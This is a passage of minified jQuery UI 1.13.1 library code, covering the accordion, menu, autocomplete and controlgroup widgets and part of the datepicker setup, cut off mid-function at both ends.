ui-helper-reset"),this.element.attr("role","tablist"),a.collapsible|| !1!==a.active&&null!=a.active||(a.active=0),this._processPanels(),a.active<0&&(a.active+=this.headers.length),this._refresh()},_getCreateEventData:function(){return{header:this.active,panel:this.active.length?this.active.next():$()}},_createIcons:function(){var b,c,a=this.options.icons;a&&(b=$("<span>"),this._addClass(b,"ui-accordion-header-icon","ui-icon "+a.header),b.prependTo(this.headers),c=this.active.children(".ui-accordion-header-icon"),this._removeClass(c,a.header)._addClass(c,null,a.activeHeader)._addClass(this.headers,"ui-accordion-icons"))},_destroyIcons:function(){this._removeClass(this.headers,"ui-accordion-icons"),this.headers.children(".ui-accordion-header-icon").remove()},_destroy:function(){var a;this.element.removeAttr("role"),this.headers.removeAttr("role aria-expanded aria-selected aria-controls tabIndex").removeUniqueId(),this._destroyIcons(),a=this.headers.next().css("display","").removeAttr("role aria-hidden aria-labelledby").removeUniqueId(),"content"!==this.options.heightStyle&&a.css("height","")},_setOption:function(a,b){if("active"===a){this._activate(b);return}"event"===a&&(this.options.event&&this._off(this.headers,this.options.event),this._setupEvents(b)),this._super(a,b),"collapsible"!==a||b|| !1!==this.options.active||this._activate(0),"icons"===a&&(this._destroyIcons(),b&&this._createIcons())},_setOptionDisabled:function(a){this._super(a),this.element.attr("aria-disabled",a),this._toggleClass(null,"ui-state-disabled",!!a),this._toggleClass(this.headers.add(this.headers.next()),null,"ui-state-disabled",!!a)},_keydown:function(b){if(!b.altKey&&!b.ctrlKey){var a=$.ui.keyCode,d=this.headers.length,e=this.headers.index(b.target),c=!1;switch(b.keyCode){case a.RIGHT:case a.DOWN:c=this.headers[(e+1)%d];break;case a.LEFT:case a.UP:c=this.headers[(e-1+d)%d];break;case a.SPACE:case a.ENTER:this._eventHandler(b);break;case a.HOME:c=this.headers[0];break;case a.END:c=this.headers[d-1]}c&&($(b.target).attr("tabIndex",-1),$(c).attr("tabIndex",0),$(c).trigger("focus"),b.preventDefault())}},_panelKeyDown:function(a){a.keyCode===$.ui.keyCode.UP&&a.ctrlKey&&$(a.currentTarget).prev().trigger("focus")},refresh:function(){var a=this.options;this._processPanels(),(!1!==a.active|| !0!==a.collapsible)&&this.headers.length?!1===a.active?this._activate(0):this.active.length&&!$.contains(this.element[0],this.active[0])?this.headers.length===this.headers.find(".ui-state-disabled").length?(a.active=!1,this.active=$()):this._activate(Math.max(0,a.active-1)):a.active=this.headers.index(this.active):(a.active=!1,this.active=$()),this._destroyIcons(),this._refresh()},_processPanels:function(){var b=this.headers,a=this.panels;"function"==typeof this.options.header?this.headers=this.options.header(this.element):this.headers=this.element.find(this.options.header),this._addClass(this.headers,"ui-accordion-header ui-accordion-header-collapsed","ui-state-default"),this.panels=this.headers.next().filter(":not(.ui-accordion-content-active)").hide(),this._addClass(this.panels,"ui-accordion-content","ui-helper-reset ui-widget-content"),a&&(this._off(b.not(this.headers)),this._off(a.not(this.panels)))},_refresh:function(){var a,b=this.options,c=b.heightStyle,d=this.element.parent();this.active=this._findActive(b.active),this._addClass(this.active,"ui-accordion-header-active","ui-state-active")._removeClass(this.active,"ui-accordion-header-collapsed"),this._addClass(this.active.next(),"ui-accordion-content-active"),this.active.next().show(),this.headers.attr("role","tab").each(function(){var a=$(this),c=a.uniqueId().attr("id"),b=a.next(),d=b.uniqueId().attr("id");a.attr("aria-controls",d),b.attr("aria-labelledby",c)}).next().attr("role","tabpanel"),this.headers.not(this.active).attr({"aria-selected":"false","aria-expanded":"false",tabIndex:-1}).next().attr({"aria-hidden":"true"}).hide(),this.active.length?this.active.attr({"aria-selected":"true","aria-expanded":"true",tabIndex:0}).next().attr({"aria-hidden":"false"}):this.headers.eq(0).attr("tabIndex",0),this._createIcons(),this._setupEvents(b.event),"fill"===c?(a=d.height(),this.element.siblings(":visible").each(function(){var b=$(this),c=b.css("position");"absolute"!==c&&"fixed"!==c&&(a-=b.outerHeight(!0))}),this.headers.each(function(){a-=$(this).outerHeight(!0)}),this.headers.next().each(function(){$(this).height(Math.max(0,a-$(this).innerHeight()+$(this).height()))}).css("overflow","auto")):"auto"===c&&(a=0,this.headers.next().each(function(){var b=$(this).is(":visible");b||$(this).show(),a=Math.max(a,$(this).css("height","").height()),b||$(this).hide()}).height(a))},_activate:function(b){var a=this._findActive(b)[0];a!==this.active[0]&&(a=a||this.active[0],this._eventHandler({target:a,currentTarget:a,preventDefault:$.noop}))},_findActive:function(a){return"number"==typeof a?this.headers.eq(a):$()},_setupEvents:function(a){var b={keydown:"_keydown"};a&&$.each(a.split(" "),function(c,a){b[a]="_eventHandler"}),this._off(this.headers.add(this.headers.next())),this._on(this.headers,b),this._on(this.headers.next(),{keydown:"_panelKeyDown"}),this._hoverable(this.headers),this._focusable(this.headers)},_eventHandler:function(e){var f,g,a=this.options,c=this.active,b=$(e.currentTarget),d=b[0]===c[0],h=d&&a.collapsible,j=h?$():b.next(),k=c.next(),i={oldHeader:c,oldPanel:k,newHeader:h?$():b,newPanel:j};e.preventDefault(),(!d||a.collapsible)&& !1!==this._trigger("beforeActivate",e,i)&&(a.active=!h&&this.headers.index(b),this.active=d?$():b,this._toggle(i),this._removeClass(c,"ui-accordion-header-active","ui-state-active"),a.icons&&(f=c.children(".ui-accordion-header-icon"),this._removeClass(f,null,a.icons.activeHeader)._addClass(f,null,a.icons.header)),d||(this._removeClass(b,"ui-accordion-header-collapsed")._addClass(b,"ui-accordion-header-active","ui-state-active"),a.icons&&(g=b.children(".ui-accordion-header-icon"),this._removeClass(g,null,a.icons.header)._addClass(g,null,a.icons.activeHeader)),this._addClass(b.next(),"ui-accordion-content-active")))},_toggle:function(c){var b=c.newPanel,a=this.prevShow.length?this.prevShow:c.oldPanel;this.prevShow.add(this.prevHide).stop(!0,!0),this.prevShow=b,this.prevHide=a,this.options.animate?this._animate(b,a,c):(a.hide(),b.show(),this._toggleComplete(c)),a.attr({"aria-hidden":"true"}),a.prev().attr({"aria-selected":"false","aria-expanded":"false"}),b.length&&a.length?a.prev().attr({tabIndex:-1,"aria-expanded":"false"}):b.length&&this.headers.filter(function(){return 0===parseInt($(this).attr("tabIndex"),10)}).attr("tabIndex",-1),b.attr("aria-hidden","false").prev().attr({"aria-selected":"true","aria-expanded":"true",tabIndex:0})},_animate:function(a,e,j){var h,b,c,k=this,l=0,m=a.css("box-sizing"),i=a.length&&(!e.length||a.index()<e.index()),f=this.options.animate||{},d=i&&f.down||f,g=function(){k._toggleComplete(j)};return("number"==typeof d&&(c=d),"string"==typeof d&&(b=d),b=b||d.easing||f.easing,c=c||d.duration||f.duration,e.length)?a.length?void(h=a.show().outerHeight(),e.animate(this.hideProps,{duration:c,easing:b,step:function(a,b){b.now=Math.round(a)}}),a.hide().animate(this.showProps,{duration:c,easing:b,complete:g,step:function(b,a){a.now=Math.round(b),"height"!==a.prop?"content-box"===m&&(l+=a.now):"content"!==k.options.heightStyle&&(a.now=Math.round(h-e.outerHeight()-l),l=0)}})):e.animate(this.hideProps,c,b,g):a.animate(this.showProps,c,b,g)},_toggleComplete:function(b){var a=b.oldPanel,c=a.prev();this._removeClass(a,"ui-accordion-content-active"),this._removeClass(c,"ui-accordion-header-active")._addClass(c,"ui-accordion-header-collapsed"),a.length&&(a.parent()[0].className=a.parent()[0].className),this._trigger("activate",null,b)}}),$.ui.safeActiveElement=function(b){var a;try{a=b.activeElement}catch(c){a=b.body}return a||(a=b.body),a.nodeName||(a=b.body),a},$.widget("ui.menu",{version:"1.13.1",defaultElement:"<ul>",delay:300,options:{icons:{submenu:"ui-icon-caret-1-e"},items:"> *",menus:"ul",position:{my:"left top",at:"right top"},role:"menu",blur:null,focus:null,select:null},_create:function(){this.activeMenu=this.element,this.mouseHandled=!1,this.lastMousePosition={x:null,y:null},this.element.uniqueId().attr({role:this.options.role,tabIndex:0}),this._addClass("ui-menu","ui-widget ui-widget-content"),this._on({"mousedown .ui-menu-item":function(a){a.preventDefault(),this._activateItem(a)},"click .ui-menu-item":function(a){var b=$(a.target),c=$($.ui.safeActiveElement(this.document[0]));!this.mouseHandled&&b.not(".ui-state-disabled").length&&(this.select(a),a.isPropagationStopped()||(this.mouseHandled=!0),b.has(".ui-menu").length?this.expand(a):!this.element.is(":focus")&&c.closest(".ui-menu").length&&(this.element.trigger("focus",[!0]),this.active&&1===this.active.parents(".ui-menu").length&&clearTimeout(this.timer)))},"mouseenter .ui-menu-item":"_activateItem","mousemove .ui-menu-item":"_activateItem",mouseleave:"collapseAll","mouseleave .ui-menu":"collapseAll",focus:function(a,b){var c=this.active||this._menuItems().first();b||this.focus(a,c)},blur:function(a){this._delay(function(){$.contains(this.element[0],$.ui.safeActiveElement(this.document[0]))||this.collapseAll(a)})},keydown:"_keydown"}),this.refresh(),this._on(this.document,{click:function(a){this._closeOnDocumentClick(a)&&this.collapseAll(a,!0),this.mouseHandled=!1}})},_activateItem:function(a){if(!this.previousFilter&&(a.clientX!==this.lastMousePosition.x||a.clientY!==this.lastMousePosition.y)){this.lastMousePosition={x:a.clientX,y:a.clientY};var c=$(a.target).closest(".ui-menu-item"),b=$(a.currentTarget);c[0]!==b[0]||b.is(".ui-state-active")||(this._removeClass(b.siblings().children(".ui-state-active"),null,"ui-state-active"),this.focus(a,b))}},_destroy:function(){var a=this.element.find(".ui-menu-item").removeAttr("role aria-disabled").children(".ui-menu-item-wrapper").removeUniqueId().removeAttr("tabIndex role aria-haspopup");this.element.removeAttr("aria-activedescendant").find(".ui-menu").addBack().removeAttr("role aria-labelledby aria-expanded aria-hidden aria-disabled tabIndex").removeUniqueId().show(),a.children().each(function(){var a=$(this);a.data("ui-menu-submenu-caret")&&a.remove()})},_keydown:function(a){var c,d,b,e,f=!0;switch(a.keyCode){case $.ui.keyCode.PAGE_UP:this.previousPage(a);break;case $.ui.keyCode.PAGE_DOWN:this.nextPage(a);break;case $.ui.keyCode.HOME:this._move("first","first",a);break;case $.ui.keyCode.END:this._move("last","last",a);break;case $.ui.keyCode.UP:this.previous(a);break;case $.ui.keyCode.DOWN:this.next(a);break;case $.ui.keyCode.LEFT:this.collapse(a);break;case $.ui.keyCode.RIGHT:this.active&&!this.active.is(".ui-state-disabled")&&this.expand(a);break;case $.ui.keyCode.ENTER:case $.ui.keyCode.SPACE:this._activate(a);break;case $.ui.keyCode.ESCAPE:this.collapse(a);break;default:f=!1,d=this.previousFilter||"",e=!1,b=a.keyCode>=96&&a.keyCode<=105?(a.keyCode-96).toString():String.fromCharCode(a.keyCode),clearTimeout(this.filterTimer),b===d?e=!0:b=d+b,c=this._filterMenuItems(b),(c=e&& -1!==c.index(this.active.next())?this.active.nextAll(".ui-menu-item"):c).length||(b=String.fromCharCode(a.keyCode),c=this._filterMenuItems(b)),c.length?(this.focus(a,c),this.previousFilter=b,this.filterTimer=this._delay(function(){delete this.previousFilter},1e3)):delete this.previousFilter}f&&a.preventDefault()},_activate:function(a){this.active&&!this.active.is(".ui-state-disabled")&&(this.active.children("[aria-haspopup='true']").length?this.expand(a):this.select(a))},refresh:function(){var a,b,c,d,f=this,g=this.options.icons.submenu,e=this.element.find(this.options.menus);this._toggleClass("ui-menu-icons",null,!!this.element.find(".ui-icon").length),b=e.filter(":not(.ui-menu)").hide().attr({role:this.options.role,"aria-hidden":"true","aria-expanded":"false"}).each(function(){var a=$(this),b=a.prev(),c=$("<span>").data("ui-menu-submenu-caret",!0);f._addClass(c,"ui-menu-icon","ui-icon "+g),b.attr("aria-haspopup","true").prepend(c),a.attr("aria-labelledby",b.attr("id"))}),this._addClass(b,"ui-menu","ui-widget ui-widget-content ui-front"),(a=e.add(this.element).find(this.options.items)).not(".ui-menu-item").each(function(){var a=$(this);f._isDivider(a)&&f._addClass(a,"ui-menu-divider","ui-widget-content")}),d=(c=a.not(".ui-menu-item, .ui-menu-divider")).children().not(".ui-menu").uniqueId().attr({tabIndex:-1,role:this._itemRole()}),this._addClass(c,"ui-menu-item")._addClass(d,"ui-menu-item-wrapper"),a.filter(".ui-state-disabled").attr("aria-disabled","true"),this.active&&!$.contains(this.element[0],this.active[0])&&this.blur()},_itemRole:function(){return({menu:"menuitem",listbox:"option"})[this.options.role]},_setOption:function(a,b){if("icons"===a){var c=this.element.find(".ui-menu-icon");this._removeClass(c,null,this.options.icons.submenu)._addClass(c,null,b.submenu)}this._super(a,b)},_setOptionDisabled:function(a){this._super(a),this.element.attr("aria-disabled",String(a)),this._toggleClass(null,"ui-state-disabled",!!a)},focus:function(a,b){var d,c,e;this.blur(a,a&&"focus"===a.type),this._scrollIntoView(b),this.active=b.first(),c=this.active.children(".ui-menu-item-wrapper"),this._addClass(c,null,"ui-state-active"),this.options.role&&this.element.attr("aria-activedescendant",c.attr("id")),e=this.active.parent().closest(".ui-menu-item").children(".ui-menu-item-wrapper"),this._addClass(e,null,"ui-state-active"),a&&"keydown"===a.type?this._close():this.timer=this._delay(function(){this._close()},this.delay),(d=b.children(".ui-menu")).length&&a&&/^mouse/.test(a.type)&&this._startOpening(d),this.activeMenu=b.parent(),this._trigger("focus",a,{item:b})},_scrollIntoView:function(e){var f,g,a,b,c,d;this._hasScroll()&&(f=parseFloat($.css(this.activeMenu[0],"borderTopWidth"))||0,g=parseFloat($.css(this.activeMenu[0],"paddingTop"))||0,a=e.offset().top-this.activeMenu.offset().top-f-g,b=this.activeMenu.scrollTop(),c=this.activeMenu.height(),d=e.outerHeight(),a<0?this.activeMenu.scrollTop(b+a):a+d>c&&this.activeMenu.scrollTop(b+a-c+d))},blur:function(a,b){b||clearTimeout(this.timer),this.active&&(this._removeClass(this.active.children(".ui-menu-item-wrapper"),null,"ui-state-active"),this._trigger("blur",a,{item:this.active}),this.active=null)},_startOpening:function(a){clearTimeout(this.timer),"true"===a.attr("aria-hidden")&&(this.timer=this._delay(function(){this._close(),this._open(a)},this.delay))},_open:function(a){var b=$.extend({of:this.active},this.options.position);clearTimeout(this.timer),this.element.find(".ui-menu").not(a.parents(".ui-menu")).hide().attr("aria-hidden","true"),a.show().removeAttr("aria-hidden").attr("aria-expanded","true").position(b)},collapseAll:function(b,a){clearTimeout(this.timer),this.timer=this._delay(function(){var c=a?this.element:$(b&&b.target).closest(this.element.find(".ui-menu"));c.length||(c=this.element),this._close(c),this.blur(b),this._removeClass(c.find(".ui-state-active"),null,"ui-state-active"),this.activeMenu=c},a?0:this.delay)},_close:function(a){a||(a=this.active?this.active.parent():this.element),a.find(".ui-menu").hide().attr("aria-hidden","true").attr("aria-expanded","false")},_closeOnDocumentClick:function(a){return!$(a.target).closest(".ui-menu").length},_isDivider:function(a){return!/[^\-\u2014\u2013\s]/.test(a.text())},collapse:function(b){var a=this.active&&this.active.parent().closest(".ui-menu-item",this.element);a&&a.length&&(this._close(),this.focus(b,a))},expand:function(b){var a=this.active&&this._menuItems(this.active.children(".ui-menu")).first();a&&a.length&&(this._open(a.parent()),this._delay(function(){this.focus(b,a)}))},next:function(a){this._move("next","first",a)},previous:function(a){this._move("prev","last",a)},isFirstItem:function(){return this.active&&!this.active.prevAll(".ui-menu-item").length},isLastItem:function(){return this.active&&!this.active.nextAll(".ui-menu-item").length},_menuItems:function(a){return(a||this.element).find(this.options.items).filter(".ui-menu-item")},_move:function(b,c,d){var a;this.active&&(a="first"===b||"last"===b?this.active["first"===b?"prevAll":"nextAll"](".ui-menu-item").last():this.active[b+"All"](".ui-menu-item").first()),a&&a.length&&this.active||(a=this._menuItems(this.activeMenu)[c]()),this.focus(d,a)},nextPage:function(a){var c,d,b;if(!this.active){this.next(a);return}this.isLastItem()||(this._hasScroll()?(d=this.active.offset().top,b=this.element.innerHeight(),0===$.fn.jquery.indexOf("3.2.")&&(b+=this.element[0].offsetHeight-this.element.outerHeight()),this.active.nextAll(".ui-menu-item").each(function(){return(c=$(this)).offset().top-d-b<0}),this.focus(a,c)):this.focus(a,this._menuItems(this.activeMenu)[this.active?"last":"first"]()))},previousPage:function(a){var c,d,b;if(!this.active){this.next(a);return}this.isFirstItem()||(this._hasScroll()?(d=this.active.offset().top,b=this.element.innerHeight(),0===$.fn.jquery.indexOf("3.2.")&&(b+=this.element[0].offsetHeight-this.element.outerHeight()),this.active.prevAll(".ui-menu-item").each(function(){return(c=$(this)).offset().top-d+b>0}),this.focus(a,c)):this.focus(a,this._menuItems(this.activeMenu).first()))},_hasScroll:function(){return this.element.outerHeight()<this.element.prop("scrollHeight")},select:function(a){this.active=this.active||$(a.target).closest(".ui-menu-item");var b={item:this.active};this.active.has(".ui-menu").length||this.collapseAll(a,!0),this._trigger("select",a,b)},_filterMenuItems:function(a){var b=a.replace(/[\-\[\]{}()*+?.,\\\^$|#\s]/g,"\\$&"),c=new RegExp("^"+b,"i");return this.activeMenu.find(this.options.items).filter(".ui-menu-item").filter(function(){return c.test(String.prototype.trim.call($(this).children(".ui-menu-item-wrapper").text()))})}}),/*!
 * jQuery UI Autocomplete 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.widget("ui.autocomplete",{version:"1.13.1",defaultElement:"<input>",options:{appendTo:null,autoFocus:!1,delay:300,minLength:1,position:{my:"left top",at:"left bottom",collision:"none"},source:null,change:null,close:null,focus:null,open:null,response:null,search:null,select:null},requestIndex:0,pending:0,liveRegionTimer:null,_create:function(){var d,e,f,a=this.element[0].nodeName.toLowerCase(),b="textarea"===a,c="input"===a;this.isMultiLine=b|| !c&&this._isContentEditable(this.element),this.valueMethod=this.element[b||c?"val":"text"],this.isNewMenu=!0,this._addClass("ui-autocomplete-input"),this.element.attr("autocomplete","off"),this._on(this.element,{keydown:function(a){if(this.element.prop("readOnly")){d=!0,f=!0,e=!0;return}d=!1,f=!1,e=!1;var b=$.ui.keyCode;switch(a.keyCode){case b.PAGE_UP:d=!0,this._move("previousPage",a);break;case b.PAGE_DOWN:d=!0,this._move("nextPage",a);break;case b.UP:d=!0,this._keyEvent("previous",a);break;case b.DOWN:d=!0,this._keyEvent("next",a);break;case b.ENTER:this.menu.active&&(d=!0,a.preventDefault(),this.menu.select(a));break;case b.TAB:this.menu.active&&this.menu.select(a);break;case b.ESCAPE:this.menu.element.is(":visible")&&(this.isMultiLine||this._value(this.term),this.close(a),a.preventDefault());break;default:e=!0,this._searchTimeout(a)}},keypress:function(a){if(d){d=!1,(!this.isMultiLine||this.menu.element.is(":visible"))&&a.preventDefault();return}if(!e){var b=$.ui.keyCode;switch(a.keyCode){case b.PAGE_UP:this._move("previousPage",a);break;case b.PAGE_DOWN:this._move("nextPage",a);break;case b.UP:this._keyEvent("previous",a);break;case b.DOWN:this._keyEvent("next",a)}}},input:function(a){if(f){f=!1,a.preventDefault();return}this._searchTimeout(a)},focus:function(){this.selectedItem=null,this.previous=this._value()},blur:function(a){clearTimeout(this.searching),this.close(a),this._change(a)}}),this._initSource(),this.menu=$("<ul>").appendTo(this._appendTo()).menu({role:null}).hide().attr({unselectable:"on"}).menu("instance"),this._addClass(this.menu.element,"ui-autocomplete","ui-front"),this._on(this.menu.element,{mousedown:function(a){a.preventDefault()},menufocus:function(a,c){var d,b;if(this.isNewMenu&&(this.isNewMenu=!1,a.originalEvent&&/^mouse/.test(a.originalEvent.type))){this.menu.blur(),this.document.one("mousemove",function(){$(a.target).trigger(a.originalEvent)});return}b=c.item.data("ui-autocomplete-item"),!1!==this._trigger("focus",a,{item:b})&&a.originalEvent&&/^key/.test(a.originalEvent.type)&&this._value(b.value),(d=c.item.attr("aria-label")||b.value)&&String.prototype.trim.call(d).length&&(clearTimeout(this.liveRegionTimer),this.liveRegionTimer=this._delay(function(){this.liveRegion.html($("<div>").text(d))},100))},menuselect:function(b,c){var a=c.item.data("ui-autocomplete-item"),d=this.previous;this.element[0]!==$.ui.safeActiveElement(this.document[0])&&(this.element.trigger("focus"),this.previous=d,this._delay(function(){this.previous=d,this.selectedItem=a})),!1!==this._trigger("select",b,{item:a})&&this._value(a.value),this.term=this._value(),this.close(b),this.selectedItem=a}}),this.liveRegion=$("<div>",{role:"status","aria-live":"assertive","aria-relevant":"additions"}).appendTo(this.document[0].body),this._addClass(this.liveRegion,null,"ui-helper-hidden-accessible"),this._on(this.window,{beforeunload:function(){this.element.removeAttr("autocomplete")}})},_destroy:function(){clearTimeout(this.searching),this.element.removeAttr("autocomplete"),this.menu.element.remove(),this.liveRegion.remove()},_setOption:function(a,b){this._super(a,b),"source"===a&&this._initSource(),"appendTo"===a&&this.menu.element.appendTo(this._appendTo()),"disabled"===a&&b&&this.xhr&&this.xhr.abort()},_isEventTargetInWidget:function(a){var b=this.menu.element[0];return a.target===this.element[0]||a.target===b||$.contains(b,a.target)},_closeOnClickOutside:function(a){this._isEventTargetInWidget(a)||this.close()},_appendTo:function(){var a=this.options.appendTo;return a&&(a=a.jquery||a.nodeType?$(a):this.document.find(a).eq(0)),a&&a[0]||(a=this.element.closest(".ui-front, dialog")),a.length||(a=this.document[0].body),a},_initSource:function(){var a,b,c=this;Array.isArray(this.options.source)?(a=this.options.source,this.source=function(b,c){c($.ui.autocomplete.filter(a,b.term))}):"string"==typeof this.options.source?(b=this.options.source,this.source=function(a,d){c.xhr&&c.xhr.abort(),c.xhr=$.ajax({url:b,data:a,dataType:"json",success:function(a){d(a)},error:function(){d([])}})}):this.source=this.options.source},_searchTimeout:function(a){clearTimeout(this.searching),this.searching=this._delay(function(){var b=this.term===this._value(),c=this.menu.element.is(":visible"),d=a.altKey||a.ctrlKey||a.metaKey||a.shiftKey;b&&(!b||c||d)||(this.selectedItem=null,this.search(null,a))},this.options.delay)},search:function(a,b){return(a=null!=a?a:this._value(),this.term=this._value(),a.length<this.options.minLength)?this.close(b):!1!==this._trigger("search",b)?this._search(a):void 0},_search:function(a){this.pending++,this._addClass("ui-autocomplete-loading"),this.cancelSearch=!1,this.source({term:a},this._response())},_response:function(){var a=++this.requestIndex;return(function(b){a===this.requestIndex&&this.__response(b),this.pending--,this.pending||this._removeClass("ui-autocomplete-loading")}).bind(this)},__response:function(a){a&&(a=this._normalize(a)),this._trigger("response",null,{content:a}),!this.options.disabled&&a&&a.length&&!this.cancelSearch?(this._suggest(a),this._trigger("open")):this._close()},close:function(a){this.cancelSearch=!0,this._close(a)},_close:function(a){this._off(this.document,"mousedown"),this.menu.element.is(":visible")&&(this.menu.element.hide(),this.menu.blur(),this.isNewMenu=!0,this._trigger("close",a))},_change:function(a){this.previous!==this._value()&&this._trigger("change",a,{item:this.selectedItem})},_normalize:function(a){return a.length&&a[0].label&&a[0].value?a:$.map(a,function(a){return"string"==typeof a?{label:a,value:a}:$.extend({},a,{label:a.label||a.value,value:a.value||a.label})})},_suggest:function(b){var a=this.menu.element.empty();this._renderMenu(a,b),this.isNewMenu=!0,this.menu.refresh(),a.show(),this._resizeMenu(),a.position($.extend({of:this.element},this.options.position)),this.options.autoFocus&&this.menu.next(),this._on(this.document,{mousedown:"_closeOnClickOutside"})},_resizeMenu:function(){var a=this.menu.element;a.outerWidth(Math.max(a.width("").outerWidth()+1,this.element.outerWidth()))},_renderMenu:function(b,a){var c=this;$.each(a,function(d,a){c._renderItemData(b,a)})},_renderItemData:function(b,a){return this._renderItem(b,a).data("ui-autocomplete-item",a)},_renderItem:function(a,b){return $("<li>").append($("<div>").text(b.label)).appendTo(a)},_move:function(a,b){if(!this.menu.element.is(":visible")){this.search(null,b);return}if(this.menu.isFirstItem()&&/^previous/.test(a)||this.menu.isLastItem()&&/^next/.test(a)){this.isMultiLine||this._value(this.term),this.menu.blur();return}this.menu[a](b)},widget:function(){return this.menu.element},_value:function(){return this.valueMethod.apply(this.element,arguments)},_keyEvent:function(b,a){(!this.isMultiLine||this.menu.element.is(":visible"))&&(this._move(b,a),a.preventDefault())},_isContentEditable:function(a){if(!a.length)return!1;var b=a.prop("contentEditable");return"inherit"===b?this._isContentEditable(a.parent()):"true"===b}}),$.extend($.ui.autocomplete,{escapeRegex:function(a){return a.replace(/[\-\[\]{}()*+?.,\\\^$|#\s]/g,"\\$&")},filter:function(a,b){var c=new RegExp($.ui.autocomplete.escapeRegex(b),"i");return $.grep(a,function(a){return c.test(a.label||a.value||a)})}}),$.widget("ui.autocomplete",$.ui.autocomplete,{options:{messages:{noResults:"No search results.",results:function(a){return a+(a>1?" results are":" result is")+" available, use up and down arrow keys to navigate."}}},__response:function(a){var b;this._superApply(arguments),this.options.disabled||this.cancelSearch||(b=a&&a.length?this.options.messages.results(a.length):this.options.messages.noResults,clearTimeout(this.liveRegionTimer),this.liveRegionTimer=this._delay(function(){this.liveRegion.html($("<div>").text(b))},100))}}),$.ui.autocomplete;/*!
 * jQuery UI Controlgroup 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ var O=/ui-corner-([a-z]){2,6}/g;function h(){this._curInst=null,this._keyEvent=!1,this._disabledInputs=[],this._datepickerShowing=!1,this._inDialog=!1,this._mainDivId="ui-datepicker-div",this._inlineClass="ui-datepicker-inline",this._appendClass="ui-datepicker-append",this._triggerClass="ui-datepicker-trigger",this._dialogClass="ui-datepicker-dialog",this._disableClass="ui-datepicker-disabled",this._unselectableClass="ui-datepicker-unselectable",this._currentClass="ui-datepicker-current-day",this._dayOverClass="ui-datepicker-days-cell-over",this.regional=[],this.regional[""]={closeText:"Done",prevText:"Prev",nextText:"Next",currentText:"Today",monthNames:["January","February","March","April","May","June","July","August","September","October","November","December"],monthNamesShort:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],dayNames:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],dayNamesShort:["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],dayNamesMin:["Su","Mo","Tu","We","Th","Fr","Sa"],weekHeader:"Wk",dateFormat:"mm/dd/yy",firstDay:0,isRTL:!1,showMonthAfterYear:!1,yearSuffix:"",selectMonthLabel:"Select month",selectYearLabel:"Select year"},this._defaults={showOn:"focus",showAnim:"fadeIn",showOptions:{},defaultDate:null,appendText:"",buttonText:"...",buttonImage:"",buttonImageOnly:!1,hideIfNoPrevNext:!1,navigationAsDateFormat:!1,gotoCurrent:!1,changeMonth:!1,changeYear:!1,yearRange:"c-10:c+10",showOtherMonths:!1,selectOtherMonths:!1,showWeek:!1,calculateWeek:this.iso8601Week,shortYearCutoff:"+10",minDate:null,maxDate:null,duration:"fast",beforeShowDay:null,beforeShow:null,onSelect:null,onChangeMonthYear:null,onClose:null,onUpdateDatepicker:null,numberOfMonths:1,showCurrentAtPos:0,stepMonths:1,stepBigMonths:12,altField:"",altFormat:"",constrainInput:!0,showButtonPanel:!1,autoSize:!1,disabled:!1},$.extend(this._defaults,this.regional[""]),this.regional.en=$.extend(!0,{},this.regional[""]),this.regional["en-US"]=$.extend(!0,{},this.regional.en),this.dpDiv=P($("<div id='"+this._mainDivId+"' class='ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all'></div>"))}function P(b){var a="button, .ui-datepicker-prev, .ui-datepicker-next, .ui-datepicker-calendar td a";return b.on("mouseout",a,function(){$(this).removeClass("ui-state-hover"),-1!==this.className.indexOf("ui-datepicker-prev")&&$(this).removeClass("ui-datepicker-prev-hover"),-1!==this.className.indexOf("ui-datepicker-next")&&$(this).removeClass("ui-datepicker-next-hover")}).on("mouseover",a,Q)}function Q(){$.datepicker._isDisabledDatepicker(u.inline?u.dpDiv.parent()[0]:u.input[0])||($(this).parents(".ui-datepicker-calendar").find("a").removeClass("ui-state-hover"),$(this).addClass("ui-state-hover"),-1!==this.className.indexOf("ui-datepicker-prev")&&$(this).addClass("ui-datepicker-prev-hover"),-1!==this.className.indexOf("ui-datepicker-next")&&$(this).addClass("ui-datepicker-next-hover"))}function R(b,a){for(var c in $.extend(b,a),a)null==a[c]&&(b[c]=a[c]);return b}$.widget("ui.controlgroup",{version:"1.13.1",defaultElement:"<div>",options:{direction:"horizontal",disabled:null,onlyVisible:!0,items:{button:"input[type=button], input[type=submit], input[type=reset], button, a",controlgroupLabel:".ui-controlgroup-label",checkboxradio:"input[type='checkbox'], input[type='radio']",selectmenu:"select",spinner:".ui-spinner-input"}},_create:function(){this._enhance()},_enhance:function(){this.element.attr("role","toolbar"),this.refresh()},_destroy:function(){this._callChildMethod("destroy"),this.childWidgets.removeData("ui-controlgroup-data"),this.element.removeAttr("role"),this.options.items.controlgroupLabel&&this.element.find(this.options.items.controlgroupLabel).find(".ui-controlgroup-label-contents").contents().unwrap()},_initWidgets:function(){var b=this,a=[];$.each(this.options.items,function(c,d){var e,f={};if(d){if("controlgroupLabel"===c){(e=b.element.find(d)).each(function(){var a=$(this);a.children(".ui-controlgroup-label-contents").length||a.contents().wrapAll("<span class='ui-controlgroup-label-contents'></span>")}),b._addClass(e,null,"ui-widget ui-widget-content ui-state-default"),a=a.concat(e.get());return}$.fn[c]&&(f=b["_"+c+"Options"]?b["_"+c+"Options"]("middle"):{classes:{}},b.element.find(d).each(function(){var d=$(this),e=d[c]("instance"),g=$.widget.extend({},f);if("button"!==c||!d.parent(".ui-spinner").length){e||(e=d[c]()[c]("instance")),e&&(g.classes=b._resolveClassesValues(g.classes,e)),d[c](g);var h=d[c]("widget");$.data(h[0],"ui-controlgroup-data",e||d[c]("instance")),a.push(h[0])}}))}}),this.childWidgets=$($.uniqueSort(a)),this._addClass(this.childWidgets,"ui-controlgroup-item")},_callChildMethod:function(a){this.childWidgets.each(function(){var b=$(this).data("ui-controlgroup-data");b&&b[a]&&b[a]()})},_updateCornerClass:function(a,b){var c=this._buildSimpleOptions(b,"label").classes.label;this._removeClass(a,null,"ui-corner-top ui-corner-bottom ui-corner-left ui-corner-right ui-corner-all"),this._addClass(a,null,c)},_buildSimpleOptions:function(c,d){var 